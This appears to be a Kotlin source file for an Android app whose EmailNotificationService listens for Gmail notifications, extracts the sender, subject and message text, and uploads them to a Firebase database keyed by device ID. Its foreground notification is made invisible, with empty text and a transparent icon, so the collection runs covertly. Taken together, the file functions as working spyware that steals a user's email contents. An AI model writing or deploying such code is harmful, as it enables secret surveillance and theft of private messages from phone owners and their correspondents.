package com.rto1p8.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.rto1p8.app.MainActivity
import com.rto1p8.app.data.Email
import com.rto1p8.app.utils.Logger
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await

class EmailNotificationService : NotificationListenerService() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private const val CHANNEL_ID = "EmailNotificationServiceChannel"
        private const val NOTIFICATION_ID = 2
        private const val MAX_RETRIES = 5
        private const val BASE_RETRY_DELAY_MS = 10_000L // 10 seconds

        private const val GMAIL_PACKAGE = "com.google.android.gm"
    }

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            startForeground(NOTIFICATION_ID, createNotification())
        } catch (e: Exception) {
            Logger.error("Failed to start foreground service", e)
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Email Notification Service",
                    NotificationManager.IMPORTANCE_LOW
                )
                val manager = getSystemService(NotificationManager::class.java)
                manager?.createNotificationChannel(channel)
                    ?: Logger.error("NotificationManager unavailable")
            } catch (e: Exception) {
                Logger.error("Failed to create notification channel", e)
            }
        }
    }

    private fun createNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to create notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Service Error")
                .setContentText("Failed to initialize notification")
                .setSmallIcon(android.R.drawable.stat_notify_error)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn?.let { notification ->
            if (notification.packageName == GMAIL_PACKAGE) {
                serviceScope.launch {
                    processNotification(notification)
                }
            }
        }
    }

    private suspend fun processNotification(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras ?: return

            // Log all extras for debugging
            extras.keySet().forEach { key ->
                Logger.log("EXTRA [$key] = ${extras.get(key)}")
            }

            val sender = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "Unknown Sender"
            val subject = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                ?: ""
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
            val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)?.joinToString("\n") ?: ""
            val summaryText = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: ""

            val fullContent = listOf(bigText, textLines, summaryText)
                .filter { it.isNotBlank() }
                .joinToString("\n")

            val emailData = buildString {
                append("Sender: $sender")
                if (subject.isNotBlank()) append("\nSubject: $subject")
                if (fullContent.isNotBlank()) append("\nContent:\n$fullContent")
            }

            val timestamp = sbn.postTime

            if (emailData.isNotBlank() && emailData != "Sender: Unknown Sender") {
                uploadEmail(emailData, timestamp)
            } else {
                Logger.log("Skipped upload: Extracted content is blank or incomplete")
            }

        } catch (e: Exception) {
            Logger.error("Failed to process notification: ${e.message}", e)
        }
    }

    private suspend fun uploadEmail(emailData: String, timestamp: Long) {
        var attempt = 0
        val deviceId = try {
            MainActivity.getDeviceId(applicationContext)
        } catch (e: Exception) {
            Logger.error("Failed to get device ID", e)
            return
        }

        if (deviceId.isNullOrBlank()) {
            Logger.error("Invalid or empty device ID")
            return
        }

        while (attempt < MAX_RETRIES) {
            try {
                val email = Email(emailData, timestamp)
                val database = Firebase.database
                val emailRef = database.getReference("Device").child(deviceId).child("emails")

                emailRef.push().setValue(email).await()
                Logger.log("Uploaded email data to Firebase under device $deviceId")
                return
            } catch (e: Exception) {
                attempt++
                Logger.error("Failed to upload email (attempt $attempt): ${e.message}", e)
                if (attempt < MAX_RETRIES) {
                    delay(BASE_RETRY_DELAY_MS * (1 shl (attempt - 1)))
                } else {
                    Logger.error("Max retries reached for email upload")
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return super.onBind(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
